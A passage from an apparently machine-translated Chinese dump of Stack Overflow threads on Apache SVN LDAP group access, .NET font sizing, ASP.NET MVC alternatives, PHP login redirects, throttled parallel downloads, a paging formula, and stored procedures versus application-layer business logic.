> 赞同：5
> 
> 时间：2012-11-30T01:47:32.297

其他有兴趣的人的另一种替代方法：

```
Require ldap-group cn=SVN Users,cn=Users,dc=company,dc=com 
```

这是假设您在 Active Directory 中创建了一个名为 SVN 用户的组。请注意，该组周围没有双引号。

使用它而不是 Require valid-user

然后你可能不必在任何时候重新启动 apache，只需将用户添加到 AD 中的组

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-28T09:58:39.770

你不***应该***使用

```
Require valid-user 
```

但使用

```
Require group 
```

# c# - 如何在.NET中以与浏览器相同的大小呈现文本给文本的CSS

> ID：484502
> 
> 赞同：6
> 
> 时间：2009-01-27T18:02:00.467
> 
> 标签：c#, .net, css, font-size

我正在尝试在网站上创建“将网页另存为位图”功能，但在服务器端以正确大小呈现文本时遇到了一些问题。

客户端上文本的字体大小设置为：

```
.textDiv
{
    font-family: Verdana;
    font-size:16px;
} 
```

如果我尝试在服务器上渲染它

```
float emSize = 16;
g.DrawString("mytext", new Font("Verdana", emSize), Brushes.Black, x, y); 
```

服务器上的文本将变大约 20%。

new Font()的[文档](http://msdn.microsoft.com/en-us/library/164w6x6z.aspx)说第二个参数（字体大小）应该在 em 点中指定。一个 em 点到底是什么？

如果我在浏览器中指定 font-size:16em，文本会变得很大。如果我在浏览器中指定 font-size:1em 文本将大约 14px 大，但如果我将 1 作为服务器上的参数，则文本变成一条细线。

那么，我如何从浏览器 px 或 em 转换为 .net px/em。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T20:21:18.173

实际上，文档说“em-size”，而不是“em-point”（“新字体的 em-size，以磅为单位”）。它要求您以磅为单位指定大小。每英寸有 72 个点。您需要计算出用户屏幕的 DPI 和您正在绘制的画布的 DPI，并将 16px 大小乘以该比率的差异。

例如

```
(CSS_Font_Size_Pixels * Canvas_DPI) / (User_Screen_DPI * 72) = Equivalent_Point_Size 
```

您可以通过使用采用 GraphicUnit 并指定像素的 Font 构造函数重载来节省数学运算。这样，适当的大小将是：

```
(CSS_Font_Size_Pixels  / User_Screen_DPI) * Canvas_DPI 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T18:11:36.860

我有点困惑，因为您在问题中使用了两种不同的度量单位。我将尝试解释两者：

### PX

这是以像素为单位的高度。这应该和设置字体一样简单：

```
new Font("Verdana", 16F); 
```

### 电磁场

这将更难控制，因为这是行高的倍数。比如如果 1em = 14px 那么 16em = (14 * 16)px。除非您知道行高，否则这将很难复制。

该文件还说以下内容

> 新字体的 em 大小（以磅为单位）。

因此，它以 PX 或像素为您正在使用的构造函数定义。你可以试试这个构造函数，但 EM 实际上是一个根据屏幕动态调整的浏览器/CSS 实现，就像 Vectors。其中 Font 对象是一个位图，用于绘制要绘制的像素数。

[http://msdn.microsoft.com/en-us/library/ms141986.aspx](http://msdn.microsoft.com/en-us/library/ms141986.aspx)

# model-view-controller - ASP.net 是否有非微软/开源 MVC 框架？

> ID：484503
> 
> 赞同：2
> 
> 时间：2009-01-27T18:02:04.867
> 
> 标签：model-view-controller, open-source, alt.net

我过去曾看到，在 MS 对某事进行冲刺之前，.net 社区已经意识到了这一点。我在这里谈论的是 ALT NET 和开源人员，他们喜欢“如果 MS 提出了实体框架，我们就有了 NHibernate”。我只是想知道是否存在值得一看的 MVC 框架不是由 MS 构建的。

有没有？微软是不是第一个想出类似的东西的时候了？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-27T18:05:21.723

[MonoRail](http://www.castleproject.org/MonoRail/)（存在于官方 MVC 项目之前）

[FubuMVC](http://code.google.com/p/fubumvc/)（之后创建，仍处于早期阶段）

此外，如果您不依赖于 Microsoft 平台，还有很多其他平台：Ruby on Rails、CakePHP、[Django](http://docs.djangoproject.com/en/dev/faq/general/#django-appears-to-be-a-mvc-framework-but-you-call-the-controller-the-view-and-the-view-the-template-how-come-you-don-t-use-the-standard-names)、Spring (Java) 等等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-02T09:05:03.010

还有[ProMesh.NET](http://www.codeplex.com/ProMesh)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-02T09:08:42.033

如果您想到开源 MVC，请尝试 Microsoft 的 ASP.Net MVC。
它是在 Microsoft 公共许可下打开的（来源：[Heise Newsticker、德语](http://www.heise.de/newsticker/Microsofts-ASP-Net-MVC-Projekt-wird-Open-Source--/meldung/135655)和ScottGu[的博客](http://weblogs.asp.net/scottgu/archive/2009/04/01/asp-net-mvc-1-0.aspx)）。

可能有帮助:)

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2009-01-27T18:26:06.067

微软彻底颠覆了 Monorail……我认为他们甚至聘请了（MonoRail 的）首席开发人员来开发 MVC.Net 项目

# php - 如何将重定向 URL 传递到 mod_rewritten 页面

> ID：484509
> 
> 赞同：0
> 
> 时间：2009-01-27T18:03:23.367
> 
> 标签：php, mod-rewrite, url-rewriting

我 mod_rewrite 我的页面与 SO 的做法非常相似。我有`www.example.com/users/login/`哪个将在内部使用`users.login.php`哪个充当控制器。我想在登录完成后将参数作为页面重定向到。

如果你传入一个相对 URL，你最终会得到一个看起来非常奇特的 URL，因为你传入的是`questions/`看起来像的东西，`users/login/questions/`而不是`login.php?redir=questions.php`

有没有人对如何在不严重污染 URL 的情况下很好地解决这个问题有任何意见或解决方案？我认为 SO 处理它的方式是将登录表单放在“提问”页面上。我想这是一个解决方案，但我正在寻找其他可能性。

**编辑：**似乎 using`$_SERVER['HTTP_REFERER']`是迄今为止最好的解决方案。有什么理由不使用它吗？我知道您可以伪造推荐人，但这实际上会造成任何损害吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T18:10:08.750

我在包含 url 的登录表单中使用隐藏字段，它对我有用。你也可以试试。

1.  创建隐藏的输入字段。
2.  将输入字段的值设置为`$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';`
3.  获取发布的网址并将用户重定向到该网址。

注意：HTTP_REFERER 并不总是设置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T18:47:01.203

存储前一页访问的最佳实践是使用`$_SESSION`全局。使用`HTTP_REFERER`除了统计数据之外的任何东西都是在要求用户滥用，因为您可以轻松伪造推荐人。

查看有关在 cookie 中存储多个会话 ID 的链接。 [http://bytes.com/groups/php/7630-handling-multiple-sessions](http://bytes.com/groups/php/7630-handling-multiple-sessions)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T18:29:01.100

为什么不使用类似的 URL `/users/login/?r=/questions/`？或者，如果您不想使用 URL 来获取返回地址，则可以使用 HTTP 引荐来源网址。

# .net - 有没有办法多次执行一个方法，但管理连接/线程？（。网）

> ID：484511
> 
> 赞同：2
> 
> 时间：2009-01-27T18:03:55.033
> 
> 标签：.net, multithreading, connection, parallel-processing

1.  我有一个使用连接的方法（例如下载页面的方法）。
2.  我必须多次执行此方法（例如下载 1000 页）。
3.  以同步和顺序方式执行此操作需要很长时间。
4.  我的资源有限（最多 8 个线程和/或最多 50 个同时连接）
5.  我想利用所有资源来加速它。
6.  我知道并行化（PLINQ、Parallel Extensions等）可以解决问题，但我已经尝试过了，由于资源稀缺，这种方法失败了。
7.  我不想在管理资源的同时重新发明并行此类任务的轮子，必须有人以前做过，并且必须为此提供了一个库/教程。

任何人都可以帮忙吗？

**更新**当您开始将异步调用与并行化混合以获得最佳性能时，事情会变得更加复杂。这是在几个下载器上实现的，例如 Firefox 下载器，它同时获得 2 个下载，当其中一个完成时，它会获得下一个文件，依此类推。也许实现起来似乎很简单，但是当我实现它时，我曾经并且仍然很难将其通用化（对 WebRequest 和 DbCommand 有用）并处理问题（即超时）

**赏金猎人**赏金将授予第一个链接可靠且免费的 ($$) .NET 库的人，该库提供了一种简单的 C# 方法来并行化异步任务，如 HttpWebRequests.BegingetResponse 和 SqlCommand.BeginExecuteNonQuery。并行化不能等待 N 个任务完成再启动下一个 N，而是必须在 N 个初始任务之一完成后立即启动一个新任务。该方法必须提供超时处理。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-27T18:15:12.733

查看连接的计数信号量。 [http://en.wikipedia.org/wiki/Semaphore_（编程）](http://en.wikipedia.org/wiki/Semaphore_(programming))

编辑：要回答您的评论，.NET Framework 已经有一个。[http://msdn.microsoft.com/en-us/library/system.threading.semaphore.aspx](http://msdn.microsoft.com/en-us/library/system.threading.semaphore.aspx)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-01T14:22:02.290

您能否提供更多信息，为什么 Parallel Linq 不起作用？

我的观点是，您的任务最适合 Plinq。如果您在 8 核机器上运行，PLinq 将拆分为 8 个任务，并为您排队所有剩余的任务。

这是草稿代码，

```
PagesToDownload.AsParallel().ForAll(DownloadMethodWithLimitConnections); 
```

我不明白为什么 Plinq 会消耗你的资源。根据我的测试，PLinq 的性能甚至比使用 ThreadPool 还要好。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-02-01T14:23:18.387

请参阅[CCR](http://msdn.microsoft.com/en-us/library/bb648752.aspx)。这**是**做到这一点的“正确”方法，尽管您可能会发现图书馆的学习曲线有点多......

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-27T18:09:24.820

您可以使用 .NET[`System.Threading.ThreadPool`](http://msdn.microsoft.com/en-us/library/system.threading.threadpool.aspx)类。您可以使用[`ThreadPool.SetMaxThreads()`](http://msdn.microsoft.com/en-us/library/system.threading.threadpool.setmaxthreads.aspx).

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-02-04T16:12:18.587

这是我不明白的：你说最多 50 个连接，但只有 8 个线程。根据定义，每个连接“占用”/在一个线程中运行。我的意思是，您没有使用 DMA 或任何其他魔法来减轻 CPU 的负载，因此每次传输都需要一个执行上下文。如果您可以一次启动 50 个异步请求，很好，很好，这样做 - 您应该能够从同一个线程中启动它们，因为调用异步读取函数基本上不需要任何时间。例如，如果您有 8 个核心并希望确保整个核心专用于每次传输（这可能很愚蠢，但这是*您的*代码，所以...），您一次只能运行 8 次传输。

我的建议是在一个同步块内启动 50 个异步请求，以便它们在您允许它们中的任何一个完成之前全部启动（简化数学）。然后，使用 Jeremy 建议的计数信号量或 mbeckish 建议的同步队列来跟踪剩余的工作。在异步完成回调结束时，启动下一个连接（如果合适）。也就是说，启动 50 个连接，然后当一个连接完成时，使用“完成”事件处理程序启动下一个连接，直到所有工作完成。这不应该需要任何类型的额外库或框架。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-27T19:54:59.757

我强烈建议远离线程池，除非是非常短的任务。如果您选择使用信号量，请确保您只阻塞正在排队工作项的代码，而不是在工作项代码的开头，否则如果您的 (semaphore max count * 2) 是，您将很快死锁线程池大于最大池线程。

在实践中，您真的永远无法安全地获取池线程上的锁，也无法安全地调用大多数异步 API（或同步 API，如 HttpWebRequest.GetResponse，因为它还在线程池的掩护下执行异步操作）。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-01-27T20:12:24.353

1.  创建一个数据结构来跟踪哪些页面已被提取，以及哪些页面仍需要被提取。例如队列

2.  使用 Producer/Consumer Queue 模式，分派 8 个消费者线程来进行获取。这样，您就知道您永远不会超过 8 个线程的限制。

请参阅[此处](http://www.albahari.com/threading/part4.aspx#_Wait_and_Pulse)以获取一个很好的示例。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-02-01T14:20:27.490

Jeffrey Richter 有一个 Power Threading Library 可能会对您有所帮助。它塞满了样本，而且非常强大。我找不到有关连接的快速示例，但是在协调多个异步操作方面，有很多示例可能对您有用。

它可以[从这里下载，这里](http://www.wintellect.com/PowerThreading.aspx)有[几篇文章和示例](http://msdn.microsoft.com/en-us/magazine/cc301191.aspx)。此外，[此链接](http://msdn.microsoft.com/en-us/magazine/cc721613.aspx)有一篇来自 Jeffrey 的详细文章，解释了并发异步操作。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-02-01T15:17:22.943

异步 WebRequest 方法可能会显得迟缓，因为它们在执行 DNS 查找时会阻塞，然后切换到异步行为。在我自己遵循这条路径之后，启动 8 个线程将请求提供给已经启动线程来完成大部分工作的 API 似乎效率低下。您可能会重新考虑一些具有异步 WebRequest API 缺点的方法。我们的解决方案最终涉及使用同步 API，每个都在自己的线程上。我会对任何评论这种方法的正确性的人感兴趣。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-02-06T08:03:54.313

这就是您在 .net 3.5 中使用基类库的方式：对 SetMinThreads 的调用是可选的 - 看看有没有它会发生什么。

您应该在替换为 DoSomethingThatsSlow 时处理超时

```
public class ThrottledParallelRunnerTest
{
    public static void Main()
    {
        //since the process is just starting up, we need to boost this
        ThreadPool.SetMinThreads(10, 10);

        IEnumerable<string> args = from i in Enumerable.Range(1, 100)
                                   select "task #" + i;
        ThrottledParallelRun(DoSomethingThatsSlow, args, 8);
    }

    public static void DoSomethingThatsSlow(string urlOrWhatever)
    {
        Console.Out.WriteLine("{1}: began {0}", urlOrWhatever, DateTime.Now.Ticks);
        Thread.Sleep(500);
        Console.Out.WriteLine("{1}: ended {0}", urlOrWhatever, DateTime.Now.Ticks);
    }

    private static void ThrottledParallelRun<T>(Action<T> action, IEnumerable<T> args, int maxThreads)
    {
        //this thing looks after the throttling
        Semaphore semaphore = new Semaphore(maxThreads, maxThreads);

        //wrap the action in a try/finally that releases the semaphore
        Action<T> releasingAction = a =>
                                        {
                                            try
                                            {
                                                action(a);
                                            }
                                            finally
                                            {
                                                semaphore.Release();
                                            }
                                        };

        //store all the IAsyncResult - will help prevent method from returning before completion
        List<IAsyncResult> results = new List<IAsyncResult>();
        foreach (T a in args)
        {
            semaphore.WaitOne();
            results.Add(releasingAction.BeginInvoke(a, null, null));
        }

        //now let's make sure everything's returned. Maybe collate exceptions here?
        foreach (IAsyncResult result in results)
        {
            releasingAction.EndInvoke(result);
        }
    }
} 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-02-07T03:22:08.310

您应该看看 F# 异步工作流。

**你真的不希望你的代码是并行但异步的**

> 异步是指执行一些不需要阻塞调用线程的长时间运行操作的程序，例如访问网络、调用 Web 服务或执行任何其他一般 I/O 操作

[这是一篇](http://tomasp.net/blog/csharp-async.aspx)关于这个概念的非常有趣的文章，使用 C# 迭代器进行了解释。

这是一[本](http://books.google.com/books?id=NcrMkjVxahMC&pg=PA388&lpg=PA388&dq=asynchronous+workflows+crawler&source=web&ots=pkq-NDgmgE&sig=Iq5cdwqOXv_STKm2jXQkGxiyxdk&hl=en&ei=dvmMSeP5O5XW0gWL2M2nCw&sa=X&oi=book_result&resnum=4&ct=result#PPA385,M1)关于 F# 和异步编程的好书。

学习曲线非常糟糕（很多奇怪的东西：F# 语法、Async<'a> 类型、monad 等），但它是一种非常强大的方法，并且可以在现实生活中与出色的 C# 互操作一起使用。

The main idea here is continuation: while your're wating for some I/O operations let your threads do something else!

# math - 计算 CurrentGroup 的公式是什么

> ID：484514
> 
> 赞同：1
> 
> 时间：2009-01-27T18:04:06.283
> 
> 标签：math, equation

试图找出一个方程式来获取页面所在的当前组，如果它们被分组如下。

变量：

```
PageSize = 5
PageIndex = 21
GroupSize = 5
TotalItems = 1000
CurrentPage = PageIndex + 1 
```

寻找：

```
**CurrentGroup = ?** 
```

如果有 1000 个项目并且您的组大小为 5，则有 200 个组（TotalItems / GroupSize）。这意味着 CurrentPage 22 必须位于第 5 组

```
Group 1: 1 2 3 4 5
Group 2: 6 7 8 9 10
Group 3: 11 12 13 14 15
Group 4: 16 17 18 19 20
Group 5: 21 22 23 24 25 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T18:25:54.523

公式

```
1+floor((CurrentPage-1)/GroupSize) 
```

测试

```
1 -> 1 
.. 
5 -> 1 
6 -> 2 
.. 
9 -> 2
..
22 -> 5 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T18:19:54.300

我想这就是你要问的——

假设整数数学：

```
 page = ( item / ItemsPerPage ) + 1; // depends if 0 based.
 pageIndex = item % ItemsPerPage;
 group = ( page / GroupSize ); 
```

*页面*是您正在寻找的页面

*pageIndex*是它在目标页面上的位置

*group*是它基于 GroupSize 适合的实际组

本质上，您只是添加了另一个级别的分页，因此与分页相同的数学运算。

# stored-procedures - 存储过程中支持/反对业务逻辑的参数

> ID：484516
> 
> 赞同：44
> 
> 时间：2009-01-27T18:04:23.193
> 
> 标签：stored-procedures, business-logic

支持和反对存储过程中的业务逻辑的论据是什么？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2009-01-27T18:16:43.400

**反对存储过程：编程空间中的业务逻辑**

我非常看重表达的力量，我发现 SQL 空间并不是那么富有表现力。使用手头上最好的工具来完成最合适的任务。摆弄逻辑和高阶概念最好在最高级别完成。因此，存储和海量数据操作最好在服务器级别完成，可能在存储过程中。

但这取决于。如果您有多个应用程序与一种存储机制进行交互，并且您希望确保它保持其完整性和工作流程，那么您应该将所有逻辑卸载到数据库服务器中。或者，准备好管理多个应用程序中的并发开发。

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2009-01-27T18:17:37.050

我坚决反对。最大的原因之一是earino 所说的第一个原因——它住在一个地方。你不能很容易地将它集成到源代码管理中。让两个开发人员同时处理存储过程几乎是不可能的。

我的另一个主要抱怨是 SQL 不太擅长表示复杂的逻辑。您没有范围的概念，代码往往被复制粘贴，因为重用代码的能力较低（与 OO 语言相反）。

您必须让开发人员访问数据库才能在那里进行开发。在我从事过数据工作的许多组织中，人们与开发人员处于不同的世界，拥有不同的权限等。在这些情况下，将开发人员排除在数据库之外会更加困难。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2009-01-27T18:07:56.663

我的学派认为，只要业务逻辑：

*   住在*一个*地方
*   正确记录的地方
*   通过松散耦合的服务提供适当的访问
*   通过已发布的抽象接口

我不在乎逻辑是否存在于存储过程、J2EE 中间层、剪辑专家系统或其他任何地方。无论您将我们的业务逻辑存储在哪里，“痛苦守恒定律”都将保证有人会说这是错误的想法，因为组件/存储库 X 需要替换为技术/方法 Y。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2010-05-23T23:47:50.280

一些想法：请注意这是一个以 Java 为中心的回应，但这是我最近（过去 10 年）经验的大部分内容

(1) 由一个（大）开发人员团队进行并发开发。如果您的应用程序足够复杂，以至于每个开发人员都无法设置自己的私有数据库版本（带有参与的链接/参考数据/等...），那么很难让整个开发团队都在工作同一组 PL-SQL（例如）包同时存储在共享的 DEVL DB 中？然后，当人们进行更改时，您在使用无效程序/代码与表不匹配的数据库中工作时遇到了困难（我的经验）......

作为一名 Java 架构师，我认为让每个开发人员在他们的桌面上拥有一个私有 JBoss 实例并轻松地使用他们自己的一组功能，并以他们自己的节奏进行集成而不影响其他人……这让我更容易使用 . ..

(2) 持续集成工具集虽然在 DB 世界中存在一些类似的“概念”，但我的经验告诉我（我在这里选择了我目前最喜欢的同类产品）的组合：

*   mvn - 构建系统
*   junit - 自动化单元测试
*   nexus - repo manager（管理工件的生命周期版本、快照和发布）
*   哈德森 - ci 构建服务器
*   声纳 - 静态分析工具 / 代码覆盖率报告 / 更多

使用上述所有方法（免费工具）运行大型项目可以以一致/简单的方式将 XP 交付给大众，并对整个 IT 员工实施质量控制。Oracle / PL-SQL 没有可匹配的工具集

(3) 工具/库/等等... Java 可以访问其他平台无法访问的一组惊人的服务——有些是免费的，有些不是。即使是基本的，比如 log4j（是的，他们有它用于 PL/SQL，但是 pulease...它几乎不一样）允许开发人员创建可以动态更改的灵活可调的日志记录（非常适合调试） . 自动化 API 文档（通过 javadoc）。自动化的单元测试覆盖率报告。具有集成调试器/自动部署到应用服务器的令人难以置信的 IDE (Eclipse)。一个与阳光下各种类型的服务交互的 API，做任何事情的开源库，以及每个供应商 100% 的支持

(4) 服务的重用。有人评论的是真的。如果您有重型**数据驱动的业务规则** ，那么您可以争辩说这些规则应该存在于 DB 层中。为什么？以防止中间层都必须复制该逻辑。

但是对于不是数据驱动或足够复杂的业务规则也可以这样说**，OO 是更自然的选择**。如果您将所有业务逻辑都粘贴在数据库中，那么它们只能通过数据库获得。

*   如果您想在客户端或中间应用程序层完成验证并保存到数据库的往返行程怎么办？
*   如果您想在中间层缓存只读数据（为了性能）并让业务规则针对缓存的数据执行怎么办？
*   如果你有一个不需要数据库访问的中间层服务，或者你有一个可以提供自己数据的客户端怎么办？
*   如果业务规则的数据依赖部分需要访问外部服务怎么办？然后以如下所示的碎片化业务逻辑结束：

一世

```
retCode = validateSomeDate(date);
if (retCode == 1) then
   evaluateIfCustomerGetsEmail(...)//probably more stored proc invocations here...
   sendEmailMsg(....)
else if (retCode == 2) then
   performOtherBizLogicStuf(...) //again, may need data, may not need data
   triggerExternalsystemToDoSomething(...) //may not be accessible via PL/SQL 
fi 
```

我敢肯定，我们都见过像上面那样编写的系统，并且不得不在凌晨 2 点调试它们。当业务逻辑在各层之间分散时，很难对复杂流程有一个连贯的认识，并且在某些情况下它变得无法维护。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2009-01-27T18:26:21.323

“你不能很容易地将它集成到源代码管理中。” - 如果您将创建存储过程的代码放入受版本控制的脚本中，那么反对意见就会消失。如果您遵循 Scott Ambler 的敏捷数据库理念，那正是您应该做的。

并非所有开发人员都是优秀的数据建模者。我可以想到由那些认为涉足 SQL 知识使他们成为数据库专家的开发人员创建的可怕模式。我认为让开发人员与 DBA 和数据建模师一起工作很有价值。

如果只有一个应用程序使用数据库，我会说业务逻辑可以出现在中间层。如果很多应用程序共享数据库，也许最好把它放在数据库中。

SOA 提供了一种中间方式：服务拥有自己的数据。只有服务可以访问数据；获取数据意味着通过服务。在这种情况下，可以将规则放在任何一个地方。

应用程序来来去去，但数据仍然存在。

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2009-01-27T18:32:59.157

不将业务逻辑存储在存储过程中的另一个原因 - 数据库的扩展能力有限。数据库成为瓶颈是很常见的情况，这就是为什么尽可能多地承担数据库负载是个好主意。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2009-01-27T18:24:09.440

业务逻辑应该封装在一个地方。我们可以保证逻辑始终运行并始终如一地运行。使用涉及数据库实体的所有活动都必须运行的类，我们可以保证所有验证都正确运行。此代码有一个地方，项目中的任何开发人员都可以轻松打开此类并查看逻辑（因为文档可能并且确实会过时，因此代码是唯一可靠的文档形式）。

这对于存储过程来说很难做到。您可能有多个存储过程处理同一个表。将多个存储过程链接在一起以使逻辑仅驻留在一个存储过程中变得笨拙。那就是一击。您如何确定数据库中“围绕实体 X 的所有业务规则是什么”？寻找数千个试图追踪它的存储过程，玩得开心。

第二是您将业务逻辑与持久性机制联系起来。您可能不会将所有数据存储在同一个数据库中，或者一些数据可能驻留在 XML 等中。这种类型的不一致对开发人员来说是困难的。

如果逻辑仅驻留在数据库中，则很难执行验证。您真的调用 sproc 来验证数据输入表单上的每个字段吗？验证规则和业务逻辑是近亲。这个逻辑都应该在同一个地方执行！

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2013-02-01T13:28:45.507

我的几点观察：

支持存储过程：

*   经过一段时间的项目生命，在大多数情况下，瓶颈是数据库而不是 Web 服务器 - 存储过程要快得多

*   使用带有 ORM 生成的 sql 查询的 sql profiler 非常困难；使用存储过程很容易

*   您可以立即为存储过程部署修复程序，而无需服务窗口

*   就性能而言，优化存储过程比优化 ORM 代码更容易

*   您可能有许多应用程序使用相同的数据库/存储过程

*   任何复杂的数据场景都是对存储过程的投票

支持应用程序/ORM：

*   您可以使用代码存储库（使用存储过程仍然可行，但价格昂贵）

*   java/c#语言是更好的表达业务逻辑的工具

*   java / c#更容易调试（动态生成的ORM sql除外）

*   数据库引擎的独立性（但是，一个项目不太可能将数据库更改为另一个）

*   ORM 提供易于使用的数据模型

在我看来：对于大型项目 - 使用存储过程，对于其他项目 - 应用程序/ORM 可以正常工作。

归根结底，唯一重要的是数据库。

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2009-01-27T18:16:04.853

+：SQL server 有时会优化代码

+：你被强制传递参数，这限制了 SQL 注入问题

-：您的代码依赖于单个数据库（有些数据库甚至没有 SP）

-：要更改代码，您需要连接到数据库

-：逻辑没有组织好

我个人反对它，但我不得不在一个非常繁忙的网站上使用它一次。在 MS SQL 中使用 SP 带来了巨大的好处，但是一旦我实现了缓存，这些好处就不再那么大了。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2010-12-03T21:46:11.223

有句话...

当你只有一把锤子时，一切看起来都像钉子。

在我看来，没有一个答案可以适合所有情况。在我看来，很多人只是假设将业务逻辑放入数据库中总是错误的。

已经做了很多工作来使事务处理，尤其是批量操作，在数据库端完成时非常高效。自从大多数反对数据库的意见形成以来，数据库中的代码管理也得到了极大的改善。

我认为将数据库服务器视为一个持久层是错误的。如果您的处理活动在数据库服务器上完成时效率最高，那么就在那里进行。

如果没有，那就在别处做。

这一切都归结为最适合您目前正在开发的应用程序、与您合作的团队以及雇用您的客户。

那只是我的2美分。

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2011-10-05T09:49:12.947

您可以在业务逻辑层中对业务逻辑进行单元测试。如果它完全独立，则可以模拟持久性操作，因此您只测试 BL。存储过程比 linq 和 c# 更难维护/调试/单元测试。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2015-09-16T08:56:54.787

DBMS != 应用服务器

*   函数式编程（数据库存储过程）与 OOP。对于大型程序，OOP 只是标准。
*   IDE - eclipse、intellij、netbeans 以及所有用于调试、测试和分析的插件仅适用于真正的编程语言。[静态代码工具](https://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis#PL.2FSQL)。
*   如果您为 PLSQL & co 获得版本控制。是很棒的。如果您直接从您的 IDE 获得“同步视图” - 您是真正的幸运者。
*   扩展您的系统。因为数据库系统是地狱。其他“节点”需要昂贵的硬件。复制。并且可能为每个节点提供许可证。不要忘记您仍处于“函数式编程”中，理解和维护此类系统的努力要大得多。
*   你被你的数据库卡住了，尝试改变或添加来自另一家公司的新数据库
*   等等...

业务逻辑的存储过程在今天是不好的做法。改为使用 3 层架构。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2017-11-10T00:20:48.327

有不同种类的“业务逻辑”。考虑根据它与其他层或服务的关系对其进行分区。以下是从 MVC 角度来看的一些经验法则：

**a）**在数据库（存储过程）中，如果它主要与数据相关，并且可以通过连接和相对简单的 WHERE 和 SELECT 子句来完成。

**b）**在控制器中，如果它主要与路由或调度相关；即在屏幕或资源选择方面进行更大规模的 UI 流控。

**c)**在模型或视图模型中，如果它涉及复杂或复杂的计算和/或条件。

**d)**在视图（例如 Razor）中，如果它主要是显示问题，例如“友好”的重新格式化和相对简单的实现。（如果它很复杂，请考虑将其放入视图模型中。）

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2019-01-14T13:52:30.383

我的经验法则（一旦我通过思考这个问题认识到它是什么）是存储过程应该包含确保数据库内数据完整性的代码，无论存储过程是否禁止某些数据插入、删除或修改，或者是否需要进行其他更改为了数据的一致性。业务逻辑，尤其是无法在少数基于集合的操作中实现的逻辑，应该在其他地方实现。数据库不是应用程序。数据库应该是关系和约束的最终权威，即使业务规则也在其他地方实现，例如，在用户界面代码中提供反馈，以减少来自 Web 服务器的回发或消除对繁忙服务器的其他不必要的访问。可以争论是否“数据一致性” 包括复杂业务规则复杂处理的结果，但我认为通常理解上下文后就很清楚了。并非所有业务规则都作为数据关系或约束来实现。并非存储过程中的所有操作都比在单独进程中运行的代码更快，即使在跨网络的单独机器上运行的进程上也是如此。我最近做了一个演示，展示了 SSIS 中的许多操作，例如 (INSERT INTO () SELECT FROM) 在 SSIS 中通过网络在单独的机器上运行比在存储过程中运行更快（这也将结果插入数据库）通过网络）。这是一个几乎令人难以置信的结果（其中 SSIS 比原始 SQL 语句更快），并证明任何性能问题的最佳优化的发现来自现实（测试），而不是来自仅基于少数概念的逻辑。（我们仍然必须根据经验中学到的经验法则来决定要测试什么。）（SSIS 通过自动实现多线程和管道、使用 BULK INSERT（即使在原始 SQL 语句中未指定）以及发送批处理来执行得更快在一个线程上插入，同时在其他线程上创建额外的 BULK INSERT。在这种情况下，它的执行速度大约是原始 SQL 语句的两倍。）当我过去教编程和 SQL Server 课程时，PowerBuilder 用户似乎有这样的声明“Native驱动程序提供最快的数据访问”刻在他们的舌头上，

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-12-08T04:14:34.963

@Nick“我完全反对它。最大的原因之一是earino 所说的第一个原因 - 它存在于一个地方。你不能很容易地将它集成到源代码控制中。让两个开发人员一起工作几乎是不可能的同时存储过程。”

并不是说我在争论将业务逻辑放在存储过程上（恰恰相反）。但是你提出的这些理由毫无意义。存储过程只是一个可以存储在源代码控制上的 sql/DDL 工件，它也是一个部署工件（即，移交给 dba 进行部署的东西，与您移交战争/耳朵的方式非常相似IT / 部署联络员的工件）一个或多个开发人员可以在同一个存储过程的源代码控制下工作，就像您对普通旧源代码所做的那样——通过分支、版本控制和合并。

现在，如果存储过程的唯一副本（以及包含它们的包）仅存在于数据库中，那么显然您无法使用源代码控制来控制它（以及与之相关的所有问题）。但是，这不是存储过程的问题，而是关于如何使用该代码的无能问题。这与在生产环境中只有一份源代码副本同样是一种无能的表现。

我曾在包含大量代码的系统中工作过，包括 Java 和 PLSQL/DDL，它们都在 clearcase 上进行了版本控制。它们都被视为源代码，将通过严格的流程进行编译和部署，并由不同的团队进行开发。从来没有像你描述的那样有任何问题。

有**特定于上下文的**原因不将业务逻辑放入存储过程中，但这些都不是有效的。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2019-09-25T09:27:55.167

凭借所有这些微服务和微业务组件的意识形态，我们远远领先于质疑放置我们业务逻辑的正确位置。

